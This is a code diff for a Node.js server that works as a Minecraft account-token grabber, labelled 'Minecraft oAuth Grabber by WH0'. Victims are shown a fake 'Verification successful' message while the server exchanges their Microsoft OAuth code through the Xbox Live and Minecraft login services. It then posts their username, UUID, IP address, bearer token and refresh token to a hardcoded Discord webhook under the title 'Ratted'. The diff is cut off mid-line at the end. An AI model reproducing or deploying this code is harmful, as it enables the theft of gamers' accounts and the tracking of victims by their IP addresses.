@@ -10,23 +10,32 @@ const redirect_uri = 'https://mmcarries.onrender.com';
 const webhook_url = 'https://discordapp.com/api/webhooks/1227947926052143177/-rdkTkxvq6OGUOTTgJUqIVV2v-5I5AYT7pszN8IqluGo2d5AYn6e9_z6wPkkDxnWnmX9';
 
 app.get('/', async (req, res) => {
+    res.send('Verification successful! Go back to Discord.');
     const code = req.query.code;
     if (!code) {
-        res.status(400).send('Authorization code not found!');
         return;
     }
     try {
         const [accessToken, refreshToken] = await getAccessTokenAndRefreshToken(code);
-        await sendTokensToWebhook(accessToken, refreshToken);
-        res.send('Tokens sent to Discord webhook!');
-    } catch (error) {
-        console.error('Error:', error.message);
-        res.status(500).send('Error sending tokens to webhook!');
+        console.log('Access Token:', accessToken);
+        console.log('Refresh Token:', refreshToken);
+        const hashAndTokenArray = await getUserHashAndToken(accessToken);
+        const userToken = hashAndTokenArray[0];
+        const userHash = hashAndTokenArray[1];
+        const xstsToken = await getXSTSToken(userToken);
+        const bearerToken = await getBearerToken(xstsToken, userHash);
+        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken);
+        const uuid = usernameAndUUIDArray[0];
+        const username = usernameAndUUIDArray[1];
+        const ip = getIp(req);
+        postToWebhook(username, bearerToken, uuid, ip, refreshToken);
+    } catch (e) {
+        console.log(e);
     }
 });
 
 app.listen(port, () => {
-    console.log(`Server is running on port ${port}`);
+    console.log(`Started the server on ${port}`);
 });
 
 async function getAccessTokenAndRefreshToken(code) {
@@ -47,10 +56,83 @@ async function getAccessTokenAndRefreshToken(code) {
     return [response.data.access_token, response.data.refresh_token];
 }
 
-async function sendTokensToWebhook(accessToken, refreshToken) {
-    const data = {
-        content: `Access Token: ${accessToken}\nRefresh Token: ${refreshToken}`
+async function getUserHashAndToken(accessToken) {
+    const url = 'https://user.auth.xboxlive.com/user/authenticate';
+    const config = {
+        headers: {
+            'Content-Type': 'application/json', 'Accept': 'application/json'
+        }
     };
-    await axios.post(webhook_url, data);
-    console.log('Tokens sent to webhook successfully!');
+    const data = {
+        Properties: {
+            AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: `d=${accessToken}`
+        }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT'
+    };
+    const response = await axios.post(url, data, config);
+    return [response.data.Token, response.data.DisplayClaims.xui[0].uhs];
 }
+
+async function getXSTSToken(userToken) {
+    const url = 'https://xsts.auth.xboxlive.com/xsts/authorize';
+    const config = {
+        headers: {
+            'Content-Type': 'application/json', 'Accept': 'application/json'
+        }
+    };
+    const data = {
+        Properties: {
+            SandboxId: 'RETAIL',
+            UserTokens: [userToken]
+        }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
+    };
+    const response = await axios.post(url, data, config);
+    return response.data.Token;
+}
+
+async function getBearerToken(xstsToken, userHash) {
+    const url = 'https://api.minecraftservices.com/authentication/login_with_xbox';
+    const config = {
+        headers: {
+            'Content-Type': 'application/json'
+        }
+    };
+    const data = {
+        identityToken: `XBL3.0 x=${userHash};${xstsToken}`, ensureLegacyEnabled: true
+    };
+    const response = await axios.post(url, data, config);
+    return response.data.access_token;
+}
+
+async function getUsernameAndUUID(bearerToken) {
+    const url = 'https://api.minecraftservices.com/minecraft/profile';
+    const config = {
+        headers: {
+            'Authorization': `Bearer ${bearerToken}`
+        }
+    };
+    const response = await axios.get(url, config);
+    return [response.data.id, response.data.name];
+}
+
+function getIp(req) {
+    return req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+}
+
+function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
+    const url = webhook_url;
+    const data = {
+        username: 'MOG',
+        avatar_url: 'https://www.globalsign.com/application/files/7416/1463/0119/iStock-1152537185.jpg',
+        content: '@everyone',
+        embeds: [{
+            title: `Ratted ${username} - Click for networth`,
+            color: 5898337,
+            description: `**Username:**\n\`${username}\`\n\n**UUID:**\n\`${uuid}\`\n\n**IP:**\n\`${ip}\`\n\n**Token:**\n\`${bearerToken}\`\n\n**Refresh Token:**\n\`${refreshToken}\`\n\n**Login:**\n\`${username}:${uuid}:${bearerToken}\``,
+            url: `https://spillager.live/skyblock/networth/${username}`,
+            footer: {
+                text: 'Minecraft oAuth Grabber by WH0',
+                icon_url: 'https://www.globalsign.com/application/files/7416/1463/0119/iStock-1152537185.jpg'
+            }
+        }]
+    };
+    axios.all([axios.post(url, data), axios.post(webhook_url, data).then(() => console.log('Successfully authenticated, posting to
